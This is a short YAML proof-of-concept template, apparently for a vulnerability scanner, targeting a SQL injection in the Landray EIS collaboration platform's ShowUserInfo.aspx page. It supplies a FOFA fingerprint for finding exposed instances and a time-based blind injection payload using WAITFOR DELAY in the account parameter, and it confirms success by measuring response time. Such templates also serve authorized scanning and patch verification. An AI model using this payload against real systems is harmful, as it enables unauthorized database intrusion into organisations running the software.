id: poc-yaml-landray-eis-intelligent-collaboration-platform-showuserinfo-aspx-sqli
info:
  name: 蓝凌EIS 智慧协同平台 ShowUserInfo.aspx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 蓝凌EIS
  fofa: app="Landray-EIS智慧协同平台"
variables:
  t1: random_int(5,10)
  t2: t1 + 1
requests:
- method: GET
  path: /third/DingTalk/Demo/ShowUserInfo.aspx?account=1%27;WAITFOR+DELAY+%270:0:{{.t1}}%27--
  expression: status_code == 200 && contains(body,"蓝凌EIS体验系统用户信息") && duration > t1
    && duration < t2
transport: http
